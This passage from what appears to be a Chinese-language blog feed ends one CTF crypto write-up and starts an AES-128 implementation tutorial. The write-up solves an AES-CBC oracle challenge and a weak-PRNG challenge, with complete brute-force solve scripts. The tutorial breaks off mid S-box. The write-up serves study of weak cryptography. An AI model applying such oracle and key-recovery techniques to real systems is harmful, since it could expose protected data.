class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">a:<span class="hljs-built_in">bytes</span></span>):<br>    size = (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(a) % <span class="hljs-number">16</span>) % <span class="hljs-number">16</span><br>    a=<span class="hljs-built_in">list</span>(a)<br>    a.extend([size]*size)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(a)<br><br>iv = os.urandom(<span class="hljs-number">16</span>)<br>key = os.urandom(<span class="hljs-number">16</span>)<br><br>enc = AES.new(key, AES.MODE_CBC, iv)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;iv=&quot;</span>, iv.<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">try</span>:<br>        trick = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Give me your msg(hex):&quot;</span>).strip()<br>        trick = pad(<span class="hljs-built_in">bytes</span>.fromhex(trick))<br>        cipher = enc.encrypt(trick)<br>        <span class="hljs-keyword">if</span> trick == cipher <span class="hljs-keyword">and</span> trick != <span class="hljs-string">&quot;&quot;</span>:<br>            <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(cipher.<span class="hljs-built_in">hex</span>())<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Try again&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Try again&quot;</span>)<br>        exit()<br></code></pre></td></tr></table></figure><p>思路：</p><p>CBC加密原理如下：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211191044527.png" alt="image-20221119104421461"></p><p>第一次循环如果让m1=IV，c1为AES对全0字节串加密的结果，第二次循环再令m2=c1，c2也为AES对全0字节串加密的结果故c2==c1==m2,满足条件得到flag。</p><p>题解：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211191048321.png" alt="image-20221119104841260"></p><h2 id="10-Random"><a href="#10-Random" class="headerlink" title="10.Random"></a>10.Random</h2><p>描述：Weak Random，Crack it(&gt;3)</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os, random, hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span>  flag<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WeakRandom</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,seed,n,s</span>):<br>        self.x = seed<br>        self.n = n<br>        self.s = s<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        x = <span class="hljs-built_in">int</span>((self.x ** <span class="hljs-number">2</span>) // (<span class="hljs-number">10</span> ** (self.s // <span class="hljs-number">2</span>))) % self.n<br>        self.x = x<br>        high = (<span class="hljs-built_in">int</span>(hashlib.md5(<span class="hljs-built_in">str</span>(x).encode()).hexdigest(),<span class="hljs-number">16</span>) &gt;&gt; <span class="hljs-number">16</span>) &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">16</span> - <span class="hljs-number">1</span>)<br>        low = x &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">16</span> - <span class="hljs-number">1</span>)<br>        result = high &lt;&lt; <span class="hljs-number">16</span> | low<br>        <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)==<span class="hljs-number">42</span><br>seed=bytes_to_long(os.urandom(<span class="hljs-number">4</span>))<br>n = <span class="hljs-number">10001000000</span><br>s = <span class="hljs-number">4</span><br>r = WeakRandom(seed, n, s)<br>enc=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">4</span>):<br>    x=r.<span class="hljs-built_in">next</span>()<br>    m=bytes_to_long(flag[i:i+<span class="hljs-number">4</span>])<br>    enc.append(m^x)<br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-comment">#enc=[2741772603, 3265748928, 4143036380, 1027841819, 2514257662, 1097210779, 2378261371, 2498196396, 920739350, 3379745535, 2273781288]</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>已知密文前四个是flag,相当于已知第一组加密的明密文，通过明密文异或可以得到第一组的加密密钥，加密密钥由x生成，后面每一轮的密钥都由第一组的x生成，只要破解出x就ok了，我才用爆破的形式破解x。x的后16位为已知密钥的后16位，密钥的前16位为x进行 md5加密后的前16位，通过这两个信息去爆破。爆破出x之后可以生成没一轮的密钥，异或上密文可以得到明文</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>ccc=<span class="hljs-number">3305128028</span>&gt;&gt;<span class="hljs-number">16</span><br>qqq=<span class="hljs-number">3305128028</span>&amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">16</span> - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10001000000</span>):<br>    high = (<span class="hljs-built_in">int</span>(hashlib.md5(<span class="hljs-built_in">str</span>(num).encode()).hexdigest(),<span class="hljs-number">16</span>) &gt;&gt; <span class="hljs-number">16</span>) &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">16</span> - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> (high == ccc) <span class="hljs-keyword">and</span> (num &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">16</span> - <span class="hljs-number">1</span>)==qqq):   <br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(num)) <span class="hljs-comment">#等待执行结束 输出结果</span><br><span class="hljs-comment">#1983594588</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os, random, hashlib<br><br>enc=[<span class="hljs-number">2741772603</span>, <span class="hljs-number">3265748928</span>, <span class="hljs-number">4143036380</span>, <span class="hljs-number">1027841819</span>, <span class="hljs-number">2514257662</span>, <span class="hljs-number">1097210779</span>, <span class="hljs-number">2378261371</span>, <span class="hljs-number">2498196396</span>, <span class="hljs-number">920739350</span>, <span class="hljs-number">3379745535</span>, <span class="hljs-number">2273781288</span>]<br>x=<span class="hljs-number">1983594588</span><br><br>flag=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">11</span>):<br>    high = (<span class="hljs-built_in">int</span>(hashlib.md5(<span class="hljs-built_in">str</span>(x).encode()).hexdigest(),<span class="hljs-number">16</span>) &gt;&gt; <span class="hljs-number">16</span>) &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">16</span> - <span class="hljs-number">1</span>)<br>    low = x &amp; (<span class="hljs-number">2</span> ** <span class="hljs-number">16</span> - <span class="hljs-number">1</span>)<br>    result = high &lt;&lt; <span class="hljs-number">16</span> | low<br>    flag+=long_to_bytes(enc[i]^result)<br>    <span class="hljs-comment">#print(long_to_bytes(enc[i]^result))</span><br>    x = <span class="hljs-built_in">int</span>((x ** <span class="hljs-number">2</span>) // (<span class="hljs-number">100</span>)) % <span class="hljs-number">10001000000</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学编程之AES加解密</title>
    <link href="/post/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%BC%96%E7%A8%8B%E4%B9%8BAES%E5%8A%A0%E8%A7%A3%E5%AF%86.html"/>
    <url>/post/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%BC%96%E7%A8%8B%E4%B9%8BAES%E5%8A%A0%E8%A7%A3%E5%AF%86.html</url>
    
    <content type="html"><![CDATA[<h1 id="密码学编程之AES加解密"><a href="#密码学编程之AES加解密" class="headerlink" title="密码学编程之AES加解密"></a>密码学编程之AES加解密</h1><h2 id="1-AES加解密原理"><a href="#1-AES加解密原理" class="headerlink" title="1.AES加解密原理"></a>1.AES加解密原理</h2><p>这一篇博客具体细节比较向详细：<a href="https://blog.csdn.net/jiamisoft/article/details/125783821">https://blog.csdn.net/jiamisoft/article/details/125783821</a></p><p>​    AES是作为DES的替代标准出现的。AES明文分组长度为128位，即16个字节，密钥长度可以为16个字节、24个字节、或32个字节，即128位密钥、192位密钥、或256位密钥。AES中没有使用Feistel网络，其结构为SP结构。</p><p>128位密钥加密结构示意图：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211181651781.png" alt="image-20221118165157755"></p><h4 id="1-字节代换："><a href="#1-字节代换：" class="headerlink" title="(1)字节代换："></a>(1)字节代换：</h4><p>AES的字节代换操作可以简化为查表操作(本质基于一定的数学原理，之后再来填坑)</p><p>初始输入128bit(16字节)数据，可以看成4*4的字节矩阵，把每一个字节通过查表替换成对应字节</p><h4 id="2-行位移："><a href="#2-行位移：" class="headerlink" title="(2)行位移："></a>(2)行位移：</h4><p>对于4*4的矩阵，操作为：<br>第0行：保持不动；<br>第1行：循环左移1个字节；<br>第2行：循环左移2个字节；<br>第3行：循环左移3个字节。</p><h4 id="3-列混淆："><a href="#3-列混淆：" class="headerlink" title="(3)列混淆："></a>(3)列混淆：</h4><p>实际上为4*4矩阵左边乘上一个固定矩阵</p><p>要注意的是这里矩阵元素的乘法和加法是定义在GF(2^8)上的二元运算，加法相当于异或，乘法比较复杂。(有时间再写)</p><h4 id="4-轮密钥加："><a href="#4-轮密钥加：" class="headerlink" title="(4)轮密钥加："></a>(4)轮密钥加：</h4><p>轮密钥与状态矩阵进行逐比特异或操作</p><h4 id="5-密钥拓展"><a href="#5-密钥拓展" class="headerlink" title="(5)密钥拓展:"></a>(5)密钥拓展:</h4><p>密钥是128bit,但要进行11次的轮密钥加，要用初始输入密钥生成后10个密钥</p><p>原理如下图：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202211190106412.png" alt="9f6a5e3adf19d4cfa99684f44d7615b0.png"></p><h2 id="2-加解密实现代码-AES-128-py"><a href="#2-加解密实现代码-AES-128-py" class="headerlink" title="2.加解密实现代码 AES_128.py"></a>2.加解密实现代码 AES_128.py</h2><p>基本的输入格式有点怪，懒得改了，希望之后有时间写一版中间字节存储，输入16进制的，但写了一些格式转换函数，通过StrToBinList()函数能将字符串能改成我写的这种输入格式的(不熟悉这样的编程，不知道什么格式处理的最方便就怪起来了)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#输入为128bit(01二进制串)  [&#x27;01100011011010000110111101101110&#x27;, &#x27;01100111011110010110000101101110&#x27;, &#x27;01101001011100110111100101111001&#x27;, &#x27;01100100011100110000000000000000&#x27;]</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> base64 <br><br>Subchart = [<span class="hljs-number">0x63</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0xf2</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0xc5</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x2b</span>,<span class="hljs-number">0xfe</span>,<span class="hljs-number">0xd7</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0x76</span>,<br>        <span class="hljs-number">0xca</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0xfa</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-number">0xad</span>,<span class="hljs-number">0xd4</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0xaf</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0xa4</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0xc0</span>,<br>        <span class="hljs-number">0xb7</span>,<span class="hljs-number">0xfd</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x36</span>,<span class="hljs-number">0x3f</span>,<span class="hljs-number">0xf7</span>,<span class="hljs-number">0xcc</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0xa5</span>,<span class="hljs-number">0xe5</span>,<span class="hljs-number">0xf1</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0xd8</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x15</span>,<br>        <span class="hljs-number">0x04</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x23</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x05</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xe2</span>,<span class="hljs-number">0xeb</span>,<span class="hljs-number">0x27</span>,<span class="hljs-number">0xb2</span>,<span class="hljs-number">0x75</span>,<br>        <span class="hljs-number">0x09</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x5a</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x3b</span>,<span class="hljs-number">0xd6</span>,<span class="hljs-number">0xb3</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0xe3</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0x84</span>,<br>        <span class="hljs-number">0x53</span>,<span class="hljs-number">0xd1</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xed</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0xb1</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0xcb</span>,<span class="hljs-number">0xbe</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0xcf</span>,<br>        <span class="hljs-number">0xd0</span>,<span class="hljs-number">0xef</span>,<span class="hljs-number">0xaa</span>,<span class="hljs-number">0xfb</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0xf9</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x7f</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x9f</span>,<span class="hljs-number">0xa8</span>,<br>        <span class="hljs-number">0x51</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x8f</span>,<span class="hljs-number">0x92</span>,<span class="hljs-number">0x9d</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0xf5</span>,<span class="hljs-number">0xbc</span>,<span class="hljs-number">0xb6</span>,<span class="hljs-number">0xda</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xf3</span>,<span class="hljs-number">0xd2</span>,<br>        <span class="hljs-number">0xcd</span>,<span class="hljs-number">0x0c</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0xec</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x97</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0xc4</span>,<span class="hljs-number">0xa7</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x73</span>,<br>        <span class="hljs-number">0x60</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x4f</span>,<span class="hljs-number">0xdc</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x88</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0xee</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0xde</span>,<span class="hljs-number">0x5e</span>,<span class="hljs-number">0x0b</span>,<span class="hljs-number">0xdb</span>,<br>        <span class="hljs-number">0xe0</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x06</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x5c</span>,<span class="hljs-number">0xc2</span>,<span class="hljs-number">0xd3</span>,<span class="hljs-number">0xac</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x91</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x79</span>,<br>        <span class="hljs-number">0xe7</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0x37</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0xd5</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0xa9</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0xf4</span>,<span class="hljs-number">0xea</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0xae</span>,<span class="hljs-number">0x08</span>,<br>    